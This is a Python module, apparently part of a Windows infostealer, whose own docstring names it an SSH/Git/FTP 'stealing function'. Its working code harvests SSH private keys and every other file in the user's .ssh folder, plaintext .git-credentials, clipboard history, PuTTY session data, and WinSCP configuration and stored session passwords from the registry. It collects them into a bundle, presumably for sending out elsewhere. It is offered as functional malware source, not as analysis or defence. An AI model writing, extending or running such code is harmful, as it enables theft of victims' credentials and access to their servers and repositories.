# modules/ssh_git_ftp.py - SSH keys, Git credentials, clipboard, and FTP sessions

import os
import winreg
from pathlib import Path
from config import log

USERPROFILE = os.getenv('USERPROFILE')
LOCAL = os.getenv('LOCALAPPDATA')
ROAMING = os.getenv('APPDATA')

def grab_ssh_keys():
    """Grab SSH private keys"""
    ssh_keys = {}
    ssh_path = Path(USERPROFILE) / '.ssh'
    
    if not ssh_path.exists():
        log("No .ssh directory found")
        return ssh_keys
    
    # Common SSH key filenames
    key_files = [
        'id_rsa',
        'id_rsa.pub',
        'id_ed25519',
        'id_ed25519.pub',
        'id_ecdsa',
        'id_ecdsa.pub',
        'id_dsa',
        'id_dsa.pub',
        'known_hosts',
        'config',
        'authorized_keys'
    ]
    
    try:
        # Check for specific key files
        for key_file in key_files:
            key_path = ssh_path / key_file
            if key_path.exists():
                try:
                    with open(key_path, 'rb') as f:
                        ssh_keys[key_file] = f.read()
                    log(f"Grabbed {key_file}")
                except:
                    pass
        
        # Also grab any other files in .ssh directory
        for item in ssh_path.iterdir():
            if item.is_file() and item.name not in ssh_keys:
                try:
                    with open(item, 'rb') as f:
                        ssh_keys[item.name] = f.read()
                    log(f"Grabbed {item.name}")
                except:
                    pass
    
    except Exception as e:
        log(f"SSH key extraction failed: {e}")
    
    return ssh_keys

def grab_git_credentials():
    """Grab Git credentials and config"""
    git_data = {}
    
    # .gitconfig
    gitconfig_path = Path(USERPROFILE) / '.gitconfig'
    if gitconfig_path.exists():
        try:
            with open(gitconfig_path, 'r', encoding='utf-8', errors='ignore') as f:
                git_data['gitconfig'] = f.read()
            log("Grabbed .gitconfig")
        except:
            pass
    
    # .git-credentials (plaintext passwords!)
    gitcreds_path = Path(USERPROFILE) / '.git-credentials'
    if gitcreds_path.exists():
        try:
            with open(gitcreds_path, 'r', encoding='utf-8', errors='ignore') as f:
                git_data['git-credentials'] = f.read()
            log("Grabbed .git-credentials")
        except:
            pass
    
    return git_data

def grab_clipboard_history():
    """Grab Windows clipboard history"""
    clipboard_data = {}
    clipboard_path = Path(LOCAL) / 'Microsoft' / 'Windows' / 'Clipboard'
    
    if not clipboard_path.exists():
        log("Clipboard history not found")
        return clipboard_data
    
    try:
        for item in clipboard_path.rglob('*'):
            if item.is_file():
                try:
                    # Skip very large files
                    if item.stat().st_size > 10 * 1024 * 1024:
                        continue
                    
                    with open(item, 'rb') as f:
                        rel_path = item.relative_to(clipboard_path)
                        clipboard_data[str(rel_path)] = f.read()
                except:
                    pass
        
        if clipboard_data:
            log(f"Grabbed {len(clipboard_data)} clipboard history files")
    
    except Exception as e:
        log(f"Clipboard extraction failed: {e}")
    
    return clipboard_data

def grab_putty_sessions():
    """Grab PuTTY saved sessions from registry"""
    putty_sessions = {}
    
    try:
        # PuTTY stores sessions in HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions
        key_path = r"Software\SimonTatham\PuTTY\Sessions"
        
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_READ)
        except FileNotFoundError:
            log("No PuTTY sessions found")
            return putty_sessions
        
        # Enumerate sessions
        num_sessions = winreg.QueryInfoKey(key)[0]
        
        for i in range(num_sessions):
            session_name = winreg.EnumKey(key, i)
            session_path = f"{key_path}\\{session_name}"
            
            try:
                session_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, session_path, 0, winreg.KEY_READ)
                
                session_data = {
                    'name': session_name
                }
                
                # Read common values
                value_names = ['HostName', 'UserName', 'PortNumber', 'Protocol', 'ProxyHost', 'ProxyUsername']
                
                for value_name in value_names:
                    try:
                        value, _ = winreg.QueryValueEx(session_key, value_name)
                        session_data[value_name] = value
                    except:
                        pass
                
                winreg.CloseKey(session_key)
                putty_sessions[session_name] = session_data
                log(f"Grabbed PuTTY session: {session_name}")
            
            except:
                continue
        
        winreg.CloseKey(key)
    
    except Exception as e:
        log(f"PuTTY session extraction failed: {e}")
    
    return putty_sessions

def grab_winscp_sessions():
    """Grab WinSCP saved sessions from registry and INI file"""
    winscp_data = {}
    
    # WinSCP.ini file
    winscp_ini = Path(ROAMING) / 'WinSCP.ini'
    if winscp_ini.exists():
        try:
            with open(winscp_ini, 'r', encoding='utf-8', errors='ignore') as f:
                winscp_data['WinSCP.ini'] = f.read()
            log("Grabbed WinSCP.ini")
        except:
            pass
    
    # Registry sessions
    try:
        key_path = r"Software\Martin Prikryl\WinSCP 2\Sessions"
        
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_READ)
        except FileNotFoundError:
            log("No WinSCP registry sessions found")
            return winscp_data
        
        sessions = {}
        num_sessions = winreg.QueryInfoKey(key)[0]
        
        for i in range(num_sessions):
            session_name = winreg.EnumKey(key, i)
            session_path = f"{key_path}\\{session_name}"
            
            try:
                session_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, session_path, 0, winreg.KEY_READ)
                
                session_data = {
                    'name': session_name
                }
                
                # Read session values
                value_names = ['HostName', 'UserName', 'PortNumber', 'Password']
                
                for value_name in value_names:
                    try:
                        value, _ = winreg.QueryValueEx(session_key, value_name)
                        session_data[value_name] = value
                    except:
                        pass
                
                winreg.CloseKey(session_key)
                sessions[session_name] = session_data
                log(f"Grabbed WinSCP session: {session_name}")
            
            except:
                continue
        
        winreg.CloseKey(key)
        
        if sessions:
            # Convert sessions dict to formatted text
            sessions_text = "=== WinSCP Registry Sessions ===\n\n"
            for name, data in sessions.items():
                sessions_text += f"Session: {name}\n"
                for key, value in data.items():
                    if key != 'name':
                        sessions_text += f"  {key}: {value}\n"
                sessions_text += "\n"
            
            winscp_data['registry_sessions.txt'] = sessions_text
    
    except Exception as e:
        log(f"WinSCP session extraction failed: {e}")
    
    return winscp_data

def grab():
    """Main SSH/Git/FTP stealing function"""
    log("Grabbing SSH keys, Git credentials, clipboard, and FTP sessions...")
    
    data = {
        'ssh_keys': grab_ssh_keys(),
        'git': grab_git_credentials(),
        'clipboard': grab_clipboard_history(),
        'putty': grab_putty_sessions(),
        'winscp': grab_winscp_sessions()
    }
    
    # Count total items
    total = (
        len(data['ssh_keys']) +
        len(data['git']) +
        len(data['clipboard']) +
        len(data['putty']) +
        len(data['winscp'])
    )
    
    if total > 0:
        log(f"Grabbed SSH/Git/FTP data: {len(data['ssh_keys'])} SSH keys, {len(data['git'])} Git files, "
            f"{len(data['clipboard'])} clipboard files, {len(data['putty'])} PuTTY sessions, "
            f"{len(data['winscp'])} WinSCP files")
        return data
    
    log("No SSH/Git/FTP data found")
    return None